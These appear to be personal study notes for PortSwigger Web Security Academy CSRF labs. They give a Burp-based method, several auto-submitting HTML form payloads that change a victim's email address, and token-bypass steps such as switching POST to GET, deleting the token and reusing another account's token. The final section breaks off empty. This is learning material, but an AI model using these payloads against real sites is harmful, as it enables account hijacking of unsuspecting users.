# CSRF Notes

## Methodology

- In burp pro find a request that changes something you want for the user like a request to `update email`.
- right click the request and select `Engagement tools > Generate CSRF PoC`

Alternatively you can use a sample code like this without burp pro
- paste this code into your exploit server, and select `store`

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

- View the exploit to verify that it works, change the email address so that it doesn't match your own and select `deliver to victim`

__csrf token bypasses__

- change request method from post to get


## labs walkthrough

### CSRF vulnerability with no defenses

Methodology already shows how to do this one, used this one as reference

### CSRF where token validation depends on request method

- send update email from signed in user
- send to repeater 
- notice that changes to csrf token has our request rejected
- select `change request method` in repeater and send and notice csrf token no longers gets verified
- now follow methodology of right clicking and sending to `Generate CSRF PoC` on the get request

OR

- in exploit server craft this and store, the view exploit and check it works to change your email

```
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

- then deliver to victim

### CSRF where token validation depends on token being present

- again simple example will be updating a users email, sign in and do so to get the request in burp
- observe csrf value is in the request and tampering it doesn't let our request go through
- delete the csrf parameter completely, and notice that you can now get the request to happen
- right click and `generate csrf poc` for this request, enable the option in the generated poc to include an auto-submit script and click `Regenerate`  

OR

- use this code in exploit server

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

- go to exploit server, paste above code and click store
- view it for yourself that it works, then deliver to victim

### CSRF where token is not tied to user session

You have 2 account creds for this attack type 

- you will notice if you sign in with one account and update the email, then attempt it again on the other account but intercepting and changing the csrf token fromthe first account it still works.
- let's create a CSRF poc from the very first methodology and send but include your own users csrf token

### CSRF where token is tied to non-session cookie

again 2 acocunts for this attack

- 


